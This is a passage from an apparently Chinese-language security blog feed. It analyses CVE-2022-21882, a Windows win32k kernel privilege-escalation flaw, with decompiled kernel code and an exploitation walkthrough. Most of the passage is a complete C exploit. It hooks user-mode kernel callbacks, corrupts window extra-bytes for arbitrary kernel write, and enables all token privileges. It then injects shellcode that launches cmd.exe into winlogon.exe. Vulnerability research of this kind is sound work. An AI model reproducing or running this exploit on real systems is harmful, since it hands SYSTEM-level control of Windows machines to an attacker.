<h3 id="win32kfull-xxxSwitchWndProc"><a href="#win32kfull-xxxSwitchWndProc" class="headerlink" title="win32kfull!xxxSwitchWndProc"></a>win32kfull!xxxSwitchWndProc</h3><p>xxxSwitchWndProc函数中调用xxxClientAllocWindowClassExtraBytes为窗口分配额外内存，后面却没有检查窗口的ExtraBytes在用户层回调过程中是否修改，因此发生了和CVE-2021-1732同样的问题，由于窗口已经创建完毕，窗口的句柄也更容易拿到，因此漏洞更容易利用。</p>
<pre class="line-numbers language-none"><code class="language-none">_int64 __fastcall xxxSwitchWndProc(struct tagWND *a1, int a2, unsigned __int64 a3, __int64 a4)
{
    *((_QWORD *)v7 + 0x23) = v15;
    *(_DWORD *)(*(_QWORD *)v8 + 0xFCi64) = v14;
    cbExtraBytes = *(unsigned int *)(*(_QWORD *)v8 + 0xC8i64);
    v28 = cbExtraBytes;
    if ( (_DWORD)cbExtraBytes )//cbExtraBytes大于0，调用xxxClientAllocWindowClassExtraBytes
    {
        ret = (void *)xxxClientAllocWindowClassExtraBytes((unsigned int)cbExtraBytes);
        if ( !ret )
            return 0i64;
    }
    else
    {
        ret = 0i64;
    }
    if ( tagWND::RedirectedFieldpExtraBytes::operator&lt;bool&gt; bool((__int64)v7 + 0x140) )// tagWND-&gt;ExtraBytes != NULL
    {
        if ( ret )
            memmove(
            ret,
            (const void *)(*(_QWORD *)(*(_QWORD *)v8 + 0x128i64) + *(unsigned int *)(*(_QWORD *)v8 + 0xFCi64)),
            cbExtraBytes);
        tagWND = *((_QWORD *)v7 + 5);
        ExtraBytes = *(_QWORD *)(tagWND + 0x128);
        *(_QWORD *)(tagWND + 0x128) = ret;
        *(_DWORD *)(*((_QWORD *)v7 + 5) + 0xC8i64) = cbExtraBytes;
        xxxClientFreeWindowClassExtraBytes((__int64)v7, ExtraBytes);
    }
}
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h3><p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815162914670.png"></p>
<p>应用层可以通过调用NtUserMessageCall函数触发内核层的xxxSwitchWndProc函数，接着就会调用到xxxClientAllocWindowClassExtraBytes。事先在应用层hook相应的回调函数，然后调用函数NtUserConsoleControl修改tagWND_Trigger的ExtraBytes内存寻址方式为桌面堆+偏移，调用NtCallbackReturn将窗口相对桌面堆的偏移tagWND_Victim offset设置为tagWND_Trigger - &gt; ExtraBytes，Hook应用层的User32!xxxClientFreeWindowClassExtraBytes,使其不释放tagWND_Trigger -&gt; ExtraBytes。</p>
<p>触发漏洞窗口hTrigger和受害者窗口hVictim在内存上的布局：按照利用流程修改hTrigger的tagWND-&gt;Flags |= 0x800,设置tagWND_Victim相对与桌面堆的偏移为Trigger-&gt;ExtraBytes,然后对hWndTrigger调用SetWindowLong系列函数，越界修改Victim-&gt;ExtraBytes为任意内存，再对hWndVictim调用SetWindowLong系列函数任意内存写，获得任意内核地址写之后，修改当前进程的Token -&gt; Privileges,最后恢复Victim -&gt; ExtraBytes和Trigger -&gt; Flags，避免BSOD。</p>
<h3 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h3><pre class="line-numbers language-none"><code class="language-none">##include&lt;windows.h&gt;
##include&lt;stdio.h&gt;
##include&lt;stdlib.h&gt;
##include &lt;Psapi.h&gt;
##pragma comment(lib, "Psapi.lib ")

##define KERNEL_CALLBACK_TABLE_OFFSET 0x58
##define TRIGGERWND_EXTRASIZE 0xABCD
##define STATUS_INFO_LENGTH_MISMATCH  ((NTSTATUS)0xC0000004L) 

##pragma pack(1)
typedef struct 
{
    ULONG64 hWnd;                // + 0x00
    ULONG64 OffsetToDesktopHeap; // + 0x08
    ULONG64 state;               // + 0x10
    DWORD dwExStyle;             // + 0x18
    DWORD dwStyle;               // + 0x1C
    BYTE padd1[0xa8];
    ULONG64 cbWndExtra;          // + 0xC8
    BYTE padd2[0x18];
    DWORD dwExtraFlag;           // + 0xE8
    BYTE padd3[0x3c];
    ULONG64 pExtraBytes;         // + 0x128
}tagWNDK,*PWND;

##pragma pack(0)

typedef struct _SYSTEM_HANDLE
{
    PVOID Object;
    HANDLE UniqueProcessId;
    HANDLE HandleValue;
    ULONG GrantedAccess;
    USHORT CreatorBackTraceIndex;
    USHORT ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR HandleCount;
    ULONG_PTR Reserved;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

enum SYSTEM_INFORMATION_CLASS {
    SystemExtendedHandleInformation = 64
};

using NtUserMessageCall_t = NTSTATUS(*)(
    HWND hWnd,
    UINT Msg,
    WPARAM wParam,
    LPARAM lParam,
    ULONG_PTR ResultInfo,
    DWORD dwType,
    BOOL bAnsi);

using ZwQuerySystemInformation_t = NTSTATUS(*)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength);

using RtlAllocateHeap_t = PVOID(*)(PVOID HeapHandle, ULONG Flags, SIZE_T Size);

using xxxClientAllocWindowClassExtraBytes_t = NTSTATUS(*)(PDWORD Length);
using xxxClientFreeWindowClassExtraBytes_t = NTSTATUS(*WINAPI)(PVOID* pInfo);

using NtUserConsoleControl_t = NTSTATUS(__fastcall*)(DWORD64, LPVOID, DWORD);
using NtCallbackReturn_t = NTSTATUS(__fastcall*)(LPVOID, DWORD, NTSTATUS);
using HMValidateHandle_t = tagWNDK*(__fastcall*)(HANDLE, UINT);
using IsMenu_t = BOOL(*)(HMENU hMenu);

namespace gb {
    xxxClientAllocWindowClassExtraBytes_t xxxClientAllocWindowClassExtraBytes = 0;
    xxxClientFreeWindowClassExtraBytes_t xxxClientFreeWindowClassExtraBytes = 0;
    NtUserConsoleControl_t NtUserConsoleControl = 0;
    NtCallbackReturn_t NtCallbackReturn = 0;
    HMValidateHandle_t HMValidateHandle = 0;
    NtUserMessageCall_t  NtUserMessageCall = 0;
    ZwQuerySystemInformation_t ZwQuerySystemInformation = 0;
    RtlAllocateHeap_t RtlAllocateHeap = 0;

    IsMenu_t u32_IsMenu = 0;
    HMODULE g_hNtdll = 0;
    HMODULE g_hWin32u = 0;
    HMODULE g_hUser32 = 0;

    HWND g_hTriggerWnd = 0;
    HWND g_hVictimWnd = 0;

    DWORD64 TriggerDeskHeap = 0;
    DWORD64 VictimDeskHeap = 0;
    HANDLE hToken = 0;
};


VOID SetFuncHook(DWORD64 newAllocFunc,DWORD64 newFreeFunc) {
    //1.获取本进程的PEB
    DWORD64 ulCurrPEB = __readgsqword(0x60);
    printf("[+] Found ulCurrPEB = 0x%p\n", ulCurrPEB);
    //2.找到KernelCallbackTable
    DWORD64 KernelCallbackTable = ulCurrPEB + KERNEL_CALLBACK_TABLE_OFFSET;
    KernelCallbackTable = *(PDWORD64)KernelCallbackTable;
    printf("[+] Found KernelCallbackTable = 0x%p\n", KernelCallbackTable);
    DWORD64  xxxClientAllocExtraBytesFunc = *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7B * 8);
    printf("[+] Found xxxClientAllocExtraBytesFunc = 0x%p\n", xxxClientAllocExtraBytesFunc);
    gb::xxxClientAllocWindowClassExtraBytes = (xxxClientAllocWindowClassExtraBytes_t)xxxClientAllocExtraBytesFunc;

    DWORD64  xxxClientFreeExtraBytesFunc = *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7C * 8);
    printf("[+] Found xxxClientFreeExtraBytesFunc = 0x%p\n", xxxClientFreeExtraBytesFunc);
    gb::xxxClientFreeWindowClassExtraBytes = (xxxClientFreeWindowClassExtraBytes_t)xxxClientFreeExtraBytesFunc;

    //3.HOOK
    //首先需要设置页面可写属性
    DWORD dwOldProtect;
    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);
    *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7B * 8) = newAllocFunc;
    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7B * 8), 0x300, dwOldProtect, &amp;dwOldProtect);

    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7C * 8), 0x300, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);
    *(PDWORD64)((DWORD64)KernelCallbackTable + 0x7C * 8) = newFreeFunc;
    VirtualProtect((LPVOID)((DWORD64)KernelCallbackTable + 0x7C * 8), 0x300, dwOldProtect, &amp;dwOldProtect);
}

NTSTATUS WINAPI ClientFreeWindowsClassExtraBytesProxy(PVOID* pInfo) {
    PWND pwnd = (PWND)pInfo[0];
    if (pwnd-&gt;cbWndExtra == TRIGGERWND_EXTRASIZE)
        return 1;
    return gb::xxxClientFreeWindowClassExtraBytes(pInfo);
}

NTSTATUS WINAPI ClientAllocatWindowClassExtraBytesProxy(PDWORD size) {
    
    if (*size==TRIGGERWND_EXTRASIZE) {
        //获取窗口句柄
        //使用NtUserConsoleControl 将目标窗口的寻址模式修改为DesktopHeap+Offset
        printf("[+] ClientAllocatWindowClassExtraBytesProxy called! Offset = %p\n\n", gb::VictimDeskHeap);
        gb::NtUserConsoleControl(6, &amp;gb::g_hTriggerWnd, 0x10);
        //修改hWndTriggle 的 tagWnd-&gt;ExtraBytes 为 hTriggerWnd的桌面堆
        DWORD64 ulResult = gb::VictimDeskHeap ;
        return gb::NtCallbackReturn(&amp;ulResult, 24, 0);
    }
    return gb::xxxClientAllocWindowClassExtraBytes(size);
}

LRESULT __fastcall WindowProc(HWND a1, UINT a2, WPARAM a3, LPARAM a4)
{
    if (a2 != 2)
        return DefWindowProcW(a1, a2, a3, a4);
    PostQuitMessage(0);
    return 0;
}

bool CheckPrivilege(HANDLE TokenHandle)
{
    BOOL isPrivilegeSet = FALSE;
    PRIVILEGE_SET       privSet;
    LUID_AND_ATTRIBUTES Privileges[1];
    LookupPrivilegeValue(NULL, "SeDebugPrivilege", &amp;(Privileges[0].Luid));
    Privileges[0].Attributes = 0;

    privSet.PrivilegeCount = 1;
    privSet.Control = PRIVILEGE_SET_ALL_NECESSARY;
    memcpy(privSet.Privilege, Privileges, sizeof(Privileges));

    PrivilegeCheck(TokenHandle, &amp;privSet, &amp;isPrivilegeSet);
    return isPrivilegeSet;
}

DWORD getProcessId(const char* name)
{
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &amp;cbNeeded))
    {
        printf("[Error_%d] EnumProcess failed...\n", __LINE__);
        exit(0);
    }


    // Calculate how many process identifiers were returned.
    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.
    for (i = 0; i &lt; cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            DWORD processID = aProcesses[i];
            CHAR szProcessName[MAX_PATH] = "&lt;unknown&gt;";

            // Get a handle to the process.

            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                PROCESS_VM_READ,
                FALSE, processID);

            // Get the process name.

            if (NULL != hProcess)
            {
                HMODULE hMod;
                DWORD cbNeeded;

                if (EnumProcessModules(hProcess, &amp;hMod, sizeof(hMod),
                    &amp;cbNeeded))
                {
                    GetModuleBaseNameA(hProcess, hMod, szProcessName,
                        sizeof(szProcessName) / sizeof(TCHAR));
                }
            }

            // Print the process name and identifier.
            if (!lstrcmpA(szProcessName, name))
            {
                CloseHandle(hProcess);
                return (processID);
            }

            // Release the handle to the process.

            CloseHandle(hProcess);
        }
    }

    return 0;

}

void SpawnShell() {
    HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
    PVOID  pLibRemote;
    HMODULE hKernel32 = GetModuleHandleA("Kernel32");
    DWORD processID;
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
        "\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
        "\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
        "\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
        "\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
        "\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
        "\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
        "\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
        "\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
        "\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
        "\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
        "\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
        "\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
        "\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
        "\x78\x65\x00";


    if ((processID = getProcessId("winlogon.exe")) == 0)
    {
        printf("[Error_%d] Couldn't retrieve process ID...\n", __LINE__);
        return;
    }
    printf("[+] Retrieved process id: %d\n", processID);
    hSystemProcess = OpenProcess(GENERIC_ALL, false, processID);

    if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
    {
        printf("[Error_%d] Couldn't open system process...\n", __LINE__);
        return;
    }
    printf("[+] Got a handle on a system Process: %08p\n", hSystemProcess);


    pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!pLibRemote)
    {
        printf("[Error_%d] Virtual alloc failed !\n", __LINE__);
        return;
    }

    printf("[+] Allocation in system process succeded with address %08p\n", pLibRemote);

    if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
    {
        printf("[Error_%d] WriteProcessMemory failed !\n", __LINE__);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);

    printf("[+] Writing in system process succeded\n");

    if (hThread == NULL) {
        printf("[Error_%d] CreateRemoteThread failed !\n", __LINE__);
        return;
    }
    else
        printf("[+] Remote thread created !\n");
    CloseHandle(hSystemProcess);
}

ULONG64 GetToken() {
    PSYSTEM_HANDLE_INFORMATION_EX sys_handle_info_ref = NULL;
    ULONG64 Token = 0;
    ULONG len = 20;
    NTSTATUS ntst = 0;

    OpenProcessToken(GetCurrentProcess(), GENERIC_READ, &amp;gb::hToken);
    if (gb::hToken == INVALID_HANDLE_VALUE) {
        printf("[Error_%d] GetToken(): OpenProcessToken failed.\n", __LINE__);
        return 0;
    }
    //获取本进程的EPROCESS
    do {
        len *= 2;
        sys_handle_info_ref = (PSYSTEM_HANDLE_INFORMATION_EX)realloc(sys_handle_info_ref, len);
        ntst = gb::ZwQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemExtendedHandleInformation, sys_handle_info_ref, len, &amp;len);
    } while (ntst == STATUS_INFO_LENGTH_MISMATCH);

    if (ntst != 0) {
        printf("[Error_%d] GetToken(): ZwQuerySystemInformation failed.\n", __LINE__);
        if (sys_handle_info_ref)
            free(sys_handle_info_ref);
        return 0;
    }

    DWORD pid = GetCurrentProcessId();
    for (int i = 0; i &lt; sys_handle_info_ref-&gt;HandleCount; i++) {
        if (gb::hToken == sys_handle_info_ref-&gt;Handles[i].HandleValue
            &amp;&amp; (HANDLE)pid == sys_handle_info_ref-&gt;Handles[i].UniqueProcessId) {
            Token = (ULONG64)sys_handle_info_ref-&gt;Handles[i].Object;
            break;
        }
    }

    if (sys_handle_info_ref)
        free(sys_handle_info_ref);

    printf("[+] Found current process token = %p\n", Token);
    return Token;
}


BOOLEAN Init() {
    BOOLEAN bRet = TRUE;
    int offset = 0;
    DWORD64 next_code = 0;

    __try {
        gb::g_hUser32 = LoadLibraryA("user32.dll");
        if (!gb::g_hUser32) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }
        //获取u32_IsMenu
        gb::u32_IsMenu = (IsMenu_t)GetProcAddress(gb::g_hUser32, "IsMenu");
        if (!gb::u32_IsMenu) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }

        for (int i = 0; i &lt; 0x100; i++) {
            PUCHAR tr = (PUCHAR)gb::u32_IsMenu + i;
            if (*tr == 0xE8)
            {//找到调用HMValidateHandle的指令位置
                offset = *(int*)((PCHAR)gb::u32_IsMenu + i + 1);
                next_code = (DWORD64)gb::u32_IsMenu + i + 5;
                gb::HMValidateHandle = (HMValidateHandle_t)(next_code + offset);
                break;
            }
        }
        if (!gb::HMValidateHandle) {
            printf("[!] Error: Can not find HMValidateHandle!\n");
            bRet = FALSE;
            __leave;
        }

        printf("[+] Found HMValidateHandle = 0x%p\n", gb::HMValidateHandle);

        gb::g_hNtdll = LoadLibraryA("ntdll.dll");
        if (!gb::g_hNtdll) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }

        gb::g_hWin32u = LoadLibraryA("win32u.dll");
        if (!gb::g_hWin32u) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }
        
        gb::NtCallbackReturn = (NtCallbackReturn_t)GetProcAddress(gb::g_hNtdll, "NtCallbackReturn");
        gb::NtUserMessageCall = (NtUserMessageCall_t)GetProcAddress(gb::g_hWin32u, "NtUserMessageCall");
        gb::NtUserConsoleControl = (NtUserConsoleControl_t)GetProcAddress(gb::g_hWin32u, "NtUserConsoleControl");
        gb::ZwQuerySystemInformation = (ZwQuerySystemInformation_t)GetProcAddress(gb::g_hNtdll, "NtQuerySystemInformation");
        gb::RtlAllocateHeap = (RtlAllocateHeap_t)GetProcAddress(gb::g_hNtdll, "RtlAllocateHeap");
        if (gb::NtCallbackReturn==0 || gb::NtUserMessageCall==0 || 
            gb::NtUserConsoleControl==0 || gb::ZwQuerySystemInformation==0 ||
            gb::RtlAllocateHeap==0) {
            printf("[!] Error: %d, Code = 0x%p", __LINE__, GetLastError());
            bRet = FALSE;
            __leave;
        }
    }
    __finally {

    }
    return bRet;
}

int main(int argc,char *argv[]) {

    if (argc &lt;= 1) {
        printf(
        "Usage:\n"
        "         Example: CVE-2022-21882.exe whoami\n"
        );
        return 0;
    }

    WNDCLASSEXW WndClassExW = { 0 };

    ULONG64 TokenAddr = 0;

    if (Init()) {

        TokenAddr = GetToken();

        if (TokenAddr == 0) {
            printf("[-] Error(%u): GetToken failed.\n");
            return 0;
        }

        WndClassExW.hIcon = 0;
        WndClassExW.hbrBackground = 0;
        WndClassExW.lpszClassName = 0;
        WndClassExW.lpfnWndProc = (WNDPROC)WindowProc;
        WndClassExW.cbSize = sizeof(WNDCLASSEXW);
        WndClassExW.style = CS_VREDRAW | CS_HREDRAW;;
        WndClassExW.cbClsExtra = 0;
        WndClassExW.cbWndExtra = 0x60;
        WndClassExW.hInstance = GetModuleHandleW(0);
        WndClassExW.lpszClassName = L"VictimClass";
        //被覆盖写
        ATOM atom_vic = RegisterClassExW(&amp;WndClassExW);

        WndClassExW.cbWndExtra = TRIGGERWND_EXTRASIZE;
        WndClassExW.lpszClassName = L"TriggerClass";

        //触发漏洞
        ATOM atom_trig = RegisterClassExW(&amp;WndClassExW);

        gb::g_hVictimWnd = CreateWindowExW(NULL,
            (LPCWSTR)(unsigned __int16)atom_vic,
            L"VictimWnd",
            NULL,
            0,
            0, 
            0,
            0,
            0,
            0,
            GetModuleHandleW(0),
            0);
        printf("[+] Created victim windows = 0x%p\n", gb::g_hVictimWnd);

        gb::g_hTriggerWnd = CreateWindowExW(NULL,
            (LPCWSTR)(unsigned __int16)atom_trig,
            L"TriggerBug",
            NULL,
            0,
            0,
            0,
            0,
            0,
            0,
            GetModuleHandleW(0),
            0);
        printf("[+] Created trigger windows = 0x%p\n", gb::g_hTriggerWnd);
        // 触发漏洞
        // 获取刚创建的这两个窗口的桌面堆
        PWND Trigger= gb::HMValidateHandle(gb::g_hTriggerWnd, 1);
        gb::TriggerDeskHeap = Trigger-&gt;OffsetToDesktopHeap;
        printf("[+] TriggerDeskHeap's tagWND = 0x%p\n", Trigger);
        PWND Victim = gb::HMValidateHandle(gb::g_hVictimWnd, 1);
        gb::VictimDeskHeap = Victim-&gt;OffsetToDesktopHeap;
        DWORD64 Distance = 0;
        if (gb::VictimDeskHeap&gt; gb::TriggerDeskHeap) {
            Distance=gb::VictimDeskHeap - gb::TriggerDeskHeap;
        }
        else {
            Distance = gb::TriggerDeskHeap - gb::VictimDeskHeap;
        }

        if (Distance &gt;= TRIGGERWND_EXTRASIZE) {
            printf("[-] Heap spray failed!\n");
            return 0;
        }

        printf("[+] VictimDeskHeap's tagWND = 0x%p\n", Victim);
        printf("[+] TriggerDeskHeap = %p\n", gb::TriggerDeskHeap);
        printf("[+] VictimDeskHeap = %p\n", gb::VictimDeskHeap);

        // 回调函数
        SetFuncHook((DWORD64)ClientAllocatWindowClassExtraBytesProxy,(DWORD64)ClientFreeWindowsClassExtraBytesProxy);
        // 触发漏洞
        gb::NtUserMessageCall(gb::g_hTriggerWnd, WM_CREATE,0,0, NULL, 0, FALSE);

        // 修改 tagWND_victim-&gt;ExtraBytes = TokenAddr
        ULONG_PTR Old = SetWindowLongPtrW(gb::g_hTriggerWnd, 0x128+0x10, TokenAddr+0x40);
        // 修改 Token-&gt;Privileges.Enabled = 0xFFFFFFFFFFFFFFFF
        SetWindowLongPtrW(gb::g_hVictimWnd, 8, 0xFFFFFFFFFFFFFFFF);
        // 修改 Token-&gt;Privileges.Present = 0xFFFFFFFFFFFFFFFF
        SetWindowLongPtrW(gb::g_hVictimWnd, 0, 0xFFFFFFFFFFFFFFFF);

        if (CheckPrivilege(gb::hToken)) {
            SpawnShell();
        }
        else {
            printf("[+] 提权失败！\n");
        } 

        // 恢复 tagWND_Victim-&gt;ExtraBytes = Old
        SetWindowLongPtrW(gb::g_hTriggerWnd, 0x128 + 0x10, Old);
        // 恢复 tagWND_Trigger-&gt;Styles &amp;= ~0x800
        SetWindowLongPtrW(gb::g_hTriggerWnd, Distance + 0xE8 + 0x10, Trigger-&gt;dwExStyle);
        system("pause");
    }
    return 0;
    }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>1.触发越界写入漏洞，修改window对象的cbWndExtra为0xFFFEFFF，使用window对象WndExtra可以访问大内存。</p>
<p>2.修改另一个窗口的WS_CHILD标志，为另一个窗口设置一个专门构造的Menu(fake menu)</p>
<p>3.通过GetMenuBarInfo API和假菜单获取任意读取原语。</p>
<p>4.使用SetWindowLongPtrA API修改另一个窗口对象的ExtraBytes以获得任意写入原语。</p>
<p>5.通过EPROCESS ActiveProcessLinks找到PID为4的系统eprocess</p>
<p>6.读取系统token，替换当前进程token</p>
<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173152485.png"></p>
<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173215705.png"></p>
<p><img src="/2023/03/07/CVE-2022-21882%20win32k%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/image-20220815173238270.png"></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>CVE</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2022-30190 MSDT远程代码注入漏洞分析</title>
    <url>/2023/04/16/CVE-2022-30190%20MSDT%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
